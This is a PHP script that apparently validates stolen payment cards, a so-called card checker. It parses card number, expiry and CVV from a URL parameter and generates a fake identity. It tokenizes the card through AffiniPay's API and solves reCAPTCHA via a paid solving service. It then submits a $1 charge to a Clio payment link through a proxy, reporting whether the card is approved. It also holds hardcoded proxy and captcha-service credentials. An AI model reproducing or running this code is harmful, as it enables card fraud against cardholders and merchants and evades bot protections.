<?php
error_reporting(0);
$time_start = microtime(true);
set_time_limit(200);

include("firstDataMessage.php");
function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


function RandomString($length = 16)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function cURLc($url, $headers, $postfields, $customrequest, $cookies) {


    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        // CURLOPT_SSL_VERIFYPEER => 1,
        // CURLOPT_SSL_VERIFYHOST => 1,
        // CURLOPT_COOKIE => "itrack=$cookies",
        CURLOPT_HEADER => 1,
        CURLOPT_CUSTOMREQUEST => $customrequest,
//        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookies.txt",
//        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookies.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}


function cURL($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => $_fls,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_SSL_VERIFYHOST => 0,
//        CURLOPT_COOKIE => "itrack=$cookie",
        CURLOPT_HEADER => 1,
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

function cURL_ProxyOn($url, $headers, $postfields, $customrequest, $_fls, $cookies) {

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => $_fls,
        CURLOPT_PROXY => "isp2.hydraproxy.com:9989",
        CURLOPT_PROXYUSERPWD => "rodm26298vzpo63485:SILNes0gboZ7gsle",
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIE => "itrack=$cookies",
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookies.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookies.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

extract($_GET);
$separator = explode("|", $lista);
$cc = $separator[0];
$ccbin = substr($cc, 0,6);
$mm = $separator[1];
$m = ltrim($mm,0);
$yy = $separator[2];
$yy1 = substr($yy, 2,2);
$cvv = $separator[3];
$str = substr(RandomString(),0,7);
$cbin = substr($cc, 0,1);

if($cbin == 5){
    $cbin = 'masterCard';
}
else if($cbin == 4){
    $cbin = 'visa';
}

function solveCaptcha($site,$siteKey,$clientKey){
    $createTask =  cURL(
        "https://api.capmonster.cloud/createTask",
        $headers = [
            "Content-Type: application/json",
            "accept: application/json"
        ],
        '{"clientKey":"'.$clientKey.'","task":{"type":"RecaptchaV3TaskProxyless",
        "websiteURL":"'.$site.'",
        "websiteKey":"'.$siteKey.'",
        "minScore": 0.3,
        "pageAction": "myverify"}}',
        "POST",
        1,
        $cookie
    );
    $taskId = getstr(json_encode($createTask,true),'"taskId\":','}');
    $status = "processing";
    $gResponse = "";
    while ($status == "processing") {
        sleep(3);
        $getTaskResult =  cURL(
            "https://api.capmonster.cloud/getTaskResult ",
            $headers = [
                "Content-Type: application/json",
                "accept: application/json"
            ],
            '{"clientKey":"'.$clientKey.'","taskId": '.$taskId.'}',
            "POST",
            1,
            $cookie
        );
        $status = getstr($getTaskResult,'"status":"','"');
        $gResponse = getstr($getTaskResult,'"gRecaptchaResponse":"','"');}
    return $getTaskResult ;
}
//$port = rand(10000, 11000);
$ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => "https://binov.net/",
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_HEADER => 1,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/x-www-form-urlencoded",
        "Referer: https://binov.net/",
        "User-Agent: $uAgent"
    ],
    CURLOPT_POSTFIELDS => "BIN=$ccbin"
));
$g_ccdets = curl_exec($ch);
//$cc_bin = GetStr($g_ccdets, '</tr><tr><td>' , '</td>');
$cc_type0 = GetStr($g_ccdets, "$cc_bin</td><td>" , '</td>');
$cc_bname = GetStr($g_ccdets, "$cc_type0</td><td>" , '</td>');
$cc_type1 = GetStr($g_ccdets, "$cc_bname</td><td>" , '</td>');
$cc_type2 = GetStr($g_ccdets, "$cc_type1</td><td>" , '</td>');
$cc_country = GetStr($g_ccdets, "$cc_type2</td><td>" , '</td>');
// $CC_fDets = "BIN: $ccbin BIN Info: $type0-$type1-$type2 Bank: $cc_bname Country: $cc_country";
$CC_fDets = "Bank: $cc_bname Country: $cc_country";
$randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
$data = json_decode($randomShits, true);
$fname = explode(" ", $data['name'])[0];
$lname = explode(" ", $data['name'])[1];
$email = $data['email']['address'];
$street = $data['street1'];
$local = GetStr($randomShits, '"street2":', ',"phone"');
$city = GetStr($local, '"', ',');
$state = GetStr($local, ', ', ' ');
$phone = str_replace("-", "", $data['phone']);
$postcode = GetStr($local, "$state" , '"');
$zip = rand(91000,94000);

$ips = GetStr(file_get_contents('http://httpbin.org/ip'),'"origin": "','"');
$trans_completed = false;
$retries = 0;
$limit = 7;
//while ($trans_completed==false && $retries < $limit){
//    $uAgent = 'Mozilla/5.0 (Windows NT '.rand(11, 99).'.0; Win64; x64) AppleWebKit/'.rand(111, 999).'.'.rand(11, 99).' (KHTML, like Gecko) Chrome/'.rand(11, 99).'.0.'.rand(1111, 9999).'.'.rand(111, 999).' Safari/'.rand(111, 999).'.'.rand(11,99).'';


######################## GATEWAY CHECKER - REST API AREA ######################################################
//
//$output = json_decode(shell_exec("node node_modules/loackerusa-enc.js cc=$cc+mm=$mm+yy=$yy+cvc=$cvv+fname=$fname+lname=$lname"), true);
// $encData = $output['encryptedCardData'] ;
// $enc_cc = $output['encryptedCardNumber'] ;
// $enc_mm = $output['encryptedExpiryMonth'] ;
// $enc_yy = $output['encryptedExpiryYear'] ;
// $enc_cvv = $output['encryptedSecurityCode'] ;

$cookie = RandomString();


$page =   cURL(
    "https://app.clio.com/link/2WqE6YQRmak6",
    $headers = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53"
    ],
    '',
    "GET",
    1,
    $cookie
);

$pub_key = GetStr($page, 'public-key="','"');
$csrf = urldecode(GetStr($page, 'XSRF-TOKEN=',';'));
$id = GetStr($page, 'account-id="','"');
$token = GetStr($page, 'token="','"');
$writeKey = GetStr($page, 'window.analytics.load("','"');
$linkId = GetStr($page, 'secure-link-id="','"');
$clioRequestId = GetStr($page, 'clio-request-id="','"');


$cvv = cURL(
    "https://api.affinipay.com/chargeio/fields",
    $headers = [
        "accept: */*",
        "content-type: application/vnd.api+json",
        "referer: https://cdn.affinipay.com/",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53"
    ],
    '{"data":{"type":"legacy_field_token","attributes":{"content":"'.$cvv.'","merchant_public_key":"'.$pub_key.'"}}}',
    "POST",
    1,
    $cookie
);
$enc_cvv = GetStr($cvv, '"id":"','"');

$cc = cURL(
    "https://api.affinipay.com/chargeio/fields",
    $headers = [
        "accept: */*",
        "content-type: application/vnd.api+json",
        "referer: https://cdn.affinipay.com/",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53"
    ],
    '{"data":{"type":"legacy_field_token","attributes":{"content":"'.$cc.'","merchant_public_key":"'.$pub_key.'"}}}',
    "POST",
    1,
    $cookie
);
$enc_cc = GetStr($cc, '"id":"','"');


$methods = cURL(
    "https://api.affinipay.com/chargeio/methods",
    $headers = [
        "accept: */*",
        "content-type: application/vnd.api+json",
        "referer: https://app.clio.com/",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53"
    ],
    '{"data":{"type":"legacy_credit_card_token","attributes":{"merchant_public_key":"'.$pub_key.'","address1":"dasdas","city":"dsadas","state":"CA","postal_code":"90001","country":"US","email":"'.$fname.rand(10,99).'@gmail.com","name":"'.$fname.' '.$lname.'","expiration_date":{"month":'.$m.',"year":'.$yy.'}},"relationships":{"credit_card_number_token":{"data":{"type":"legacy_field_token","id":"'.$enc_cc.'"}},"cvv_token":{"data":{"type":"legacy_field_token","id":"'.$enc_cvv.'"}}}}}',
    "POST",
    1,
    $cookie
);
$payment_method_token = GetStr($methods, '"legacy_id":"','"');
//
$next = cURL(
    "https://api.segment.io/v1/t",
    $headers = [
        "accept: */*",
        "content-type: text/plain",
        "referer: https://app.clio.com/",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53"
    ],
    '{"timestamp":"2022-05-31T03:10:24.338Z","context":{"page":{"title":"","path":"/link/2WqE6YQRmak6","referrer":"","search":"","url":"https://app.clio.com/link/2WqE6YQRmak6"},"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53","locale":"en-US","library":{"name":"analytics.js","version":"4.1.8"}},"integrations":{},"properties":{"clioRequestId":"'.$clioRequestId.'","fromHostedFieldsPage":true,"linkId":"'.$linkId.'","page":"Secure Payment Link"},"event":"Clicked Payment Page Next Button","messageId":"ajs-0329a67903e56dc15128469429726fd4","anonymousId":"61c399ae-5f19-4901-b53e-b134230254f5","type":"track","writeKey":"'.$writeKey.'","userId":null,"sentAt":"2022-05-31T01:29:22.270Z","_metadata":{"bundled":["Facebook Pixel","Segment.io"],"unbundled":[],"bundledIds":["ZgRgn5wyDD"]}}',
    "POST",
    1,
    $cookie
);

$solve = solveCaptcha("https://app.clio.com/","6Lfmt48aAAAAAID4mU-NRUDyPCXBcMnmOC-0GLDF","3b44f75289c0aa6259def99d166474df");
$gResponse = getstr($solve,'"gRecaptchaResponse":"','"');
//
//


$execute = cURL_ProxyOn(
    "https://app.clio.com/clio_payments_page",
    $headers = [
        "Accept: application/json, text/plain, */*",
        "Content-Type: application/json;charset=UTF-8",
        "Origin: https://app.clio.com",
        "Referer: https://app.clio.com/link/2WqE6YQRmak6",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53",
        "X-XSRF-TOKEN: $csrf"
    ],
    '{"amount":1,"subject":{"id":"'.$id.'"},"description":"'.$str.'","idempotency_key":"ce673807-410a-41c7-a10d-ed8f7'.$str.'","token":"2WqE6YQRmak6","email":"'.$email.'","payment_method_token":"'.$payment_method_token.'","payment_method_token_type":"card","recaptcha_token":"'.$gResponse.'"}',
    "POST",
    1,
    $cookie
);  $response = getstr($execute,'An invalid argument was supplied: ','"}');
$dcode = getstr($execute,'"type":"','"');
$appcode = getstr($execute,'"authorization_code":"','"');

////################## CAPTURING GATEWAY RESPONSE ####################################################

 if(strpos($execute, '"authorization_code":"')) {
     echo "Response: 'Approved', Code: '".$dcode."'";

 }else if(strpos($execute,"An invalid argument was supplied")) {
     echo "Response: '".$response."', Code: '".$dcode."'";
 }else {
     echo "Response: 'ERROR', Code: '".$dcode."'";

 }
   unlink("cookies/$cookie.txt");


?>